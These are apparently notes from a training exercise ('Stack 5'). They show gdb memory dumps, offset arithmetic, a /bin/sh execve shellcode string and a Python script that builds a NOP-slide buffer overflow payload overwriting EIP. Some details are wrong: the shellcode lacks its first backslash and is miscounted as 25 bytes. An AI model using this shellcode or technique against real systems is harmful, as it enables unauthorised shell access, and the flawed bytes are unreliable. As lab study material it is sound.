# Stack 5

- inputting the ye old `AAAABBBB...` text in the buffer

exploring gdb 
```gdb
0xbffffc60:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffffc70:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffffc80:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xbffffc90:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xbffffca0:	0x51515151	0x52525252	0x53535353	0x54545454
0xbffffcb0:	0x55555555	0x56565656	0x57575757	0x58585858
0xbffffcc0:	0x59595959	0x5a5a5a5a	0xb7ffef00	0x08048232
0xbffffcd0:	0x00000001	0xbffffd10	0xb7ff0626	0xb7fffab0
```
- Buffer starts from `0xbffffc60`
- ebp is at `0xbffffcac`

NOT Overwriting $ebp, we get workable space as `72 bytes`

# Shellcode

Spwan a /bin/sh session with `x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

- Shellcode selected - execve(/bin/sh) 
- Shellcode length = 25 bytes

# Payload Generation

- 80 Bytes for whole payload (NOP Slide + shellcode)
- Rest to overwrite the return pointer (after $ebp)

## Structure
- NOP Slide length = 72-25 = 47 NOPS
- shellcode of 25 bytes
- ebp overwritten
- eip points to middle of NOP Slide .

```python
# pointerTo(start of buffer) + lengthOfNOPS//2
>>> hex(int(0xbffffc60) + 47//2)
'0xbffffc79'
```
- Middle of Nop slide = `0xbffffc79`

Hence, $eip to be overwritten to `0xbffffc79`

# Exploit

```python
import struct

nop_slide = '\x90'*47

# shellcode = 'x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

# debug
shellcode = '\xCC'*25

ebp = 'BBBB'
eip = struct.pack("I",0xbffffc79)

payload = nop_slide + shellcode + ebp + eip
print(payload)

```